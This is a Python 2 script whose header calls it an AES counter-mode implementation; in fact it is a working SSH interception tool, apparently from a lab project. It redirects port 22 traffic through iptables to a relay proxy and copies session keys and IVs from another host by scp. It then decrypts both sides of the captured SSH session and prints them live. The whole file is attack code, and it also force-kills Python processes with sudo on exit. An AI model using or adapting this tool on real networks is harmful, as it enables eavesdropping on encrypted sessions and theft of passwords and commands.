#!/usr/bin/env python
#
# AES cryptography algorithm implementation in Counter mode


from Crypto.Cipher import AES
from Crypto.Util import Counter
import sys, argparse ,os,time,signal,re

from subprocess import PIPE, Popen
from threading  import Thread

VERSION = "aes-ctr.py 0.1"
PADDING_HEADER = 10
waiting_process=0



def main():
    # check command line args
    if len(sys.argv[1:]) != 0:
        print "Error: script doesn't take arguments"
        print "Usage: python aes-ctr.py"
        sys.exit(0)
    try:
    	crypto()
    except KeyboardInterrupt:
        print 'Interrupted'
        try: 
            sys.exit(0)
        except SystemExit:
	    os.system("sudo pkill python \n")
            os._exit(0)



# Core function that performs decryption #
def crypto():
    BlockSizeForHex = 32
    Ftime= True
    string_client=''
    string_server=''
    waiting_process=Popen('cmatrix',shell=True ,preexec_fn=os.setsid)
    port_redirection_process = Popen('sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 22 -j REDIRECT --to-port 5000', shell=True)
    proxy_process = Popen('python proxy.py 132.68.60.103 5000 132.68.60.105 22', shell=True,preexec_fn=os.setsid)
	
    time.sleep(10.0)

    serverFile = open('server-data.txt', 'rb', os.O_NONBLOCK)
    clientFile = open('client-data.txt', 'rb', os.O_NONBLOCK)

	# read line without blocking
    while True:

	output_server = serverFile.read(1)
	output_client = clientFile.read(1)

	if output_server == '' and output_client == '': 
		continue
	if output_server:
	    string_server+=output_server.encode("hex")
	if output_client:
	    string_client+=output_client.encode("hex")

	if ((len(string_server)>0 or len(string_client)>0) and Ftime):
	    os.killpg(os.getpgid(waiting_process.pid), signal.SIGTERM)
	    Ftime=False

	    #copy the keys using secure copy
	    process = Popen('scp 132.68.60.104:Desktop/iv1.txt ~/Desktop/', shell=True)
            process = Popen('scp 132.68.60.104:Desktop/iv2.txt ~/Desktop/', shell=True)
	    process = Popen('scp 132.68.60.104:Desktop/key1.txt ~/Desktop/', shell=True)
	    process = Popen('scp 132.68.60.104:Desktop/key2.txt ~/Desktop/', shell=True)
	    time.sleep(2.0)

	    # READ FILE THAT CONTAINS KEY/IV
  	    f = open('key1.txt', 'rb')
    	    KEY1 = f.read()
    	    f.close()
    
  	    f = open('iv1.txt', 'rb')
 	    IV1 = f.read()
	    f.close()

 	    f = open('key2.txt', 'rb')
    	    KEY2 = f.read()
    	    f.close()
    
  	    f = open('iv2.txt', 'rb')
 	    IV2 = f.read()
	    f.close()	

	    encryptionKey1 = KEY1.decode("hex")
	    encryptionKey2 = KEY2.decode("hex")

	    # Create new Counter object #
	    # Object will automatically increment counter on each cryptographic round #
	    counter1 = Counter.new(128, initial_value=int(IV1,16))
	    counter2 = Counter.new(128, initial_value=int(IV2,16))

	    # Create new AES CTR object #
	    cipher1=AES.new(encryptionKey1, AES.MODE_CTR, counter=counter1)
	    cipher2=AES.new(encryptionKey2, AES.MODE_CTR, counter=counter2)
	if(len(string_server)>7):
		string_server=string_server.decode("hex")
		packet_len_s = (16**6)*ord(string_server[0]) + (16**4)*ord(string_server[1])+ (16**2)*ord(string_server[2]) + ord(string_server[3])
		string_server=string_server.encode("hex")
	else:
		packet_len_s=0

	if(len(string_server) > 2*packet_len_s+7):
		string_server = string_server[8:]
		padding_length = -1
		result = ''
		while(len(string_server)>= BlockSizeForHex and len(result)<packet_len_s):    
			# AES CTR operates on 16 bytes blocks #
			block = string_server[:BlockSizeForHex]
			result += cipher1.decrypt(block.decode("hex"))
			if (padding_length ==-1):
				padding_length = ord(result[0])
		 	string_server=string_server[BlockSizeForHex:]
		sys.stdout.write(result[10:-padding_length])
		sys.stdout.flush()
		if(result.find("shay") != -1):
			os.killpg(os.getpgid(proxy_process.pid), signal.SIGTERM)
			crypto()
		if(re.search(r"\b" + re.escape("logout") + r"\b", result)):
			os.killpg(os.getpgid(proxy_process.pid), signal.SIGTERM)
			crypto()

	if(len(string_client)>7):
		string_client=string_client.decode("hex")
		packet_len_c = (16**6)*ord(string_client[0]) + (16**4)*ord(string_client[1])+ (16**2)*ord(string_client[2]) + ord(string_client[3])
		string_client=string_client.encode("hex")
	else:
		packet_len_c=0

	if(len(string_client) > 2*packet_len_c+7):
		string_client = string_client[8:]
		padding_length = -1
		result = ''
		while(len(string_client)>= BlockSizeForHex and len(result)<packet_len_c):    
			# AES CTR operates on 16 bytes blocks #
			block = string_client[:BlockSizeForHex]
			result += cipher2.decrypt(block.decode("hex"))
			if (padding_length ==-1):
				padding_length = ord(result[0])
				result =result[9:]
		 	string_client=string_client[BlockSizeForHex:]
		sys.stdout.write(result[1:-padding_length])
		sys.stdout.flush()




if __name__ == '__main__':
    main()
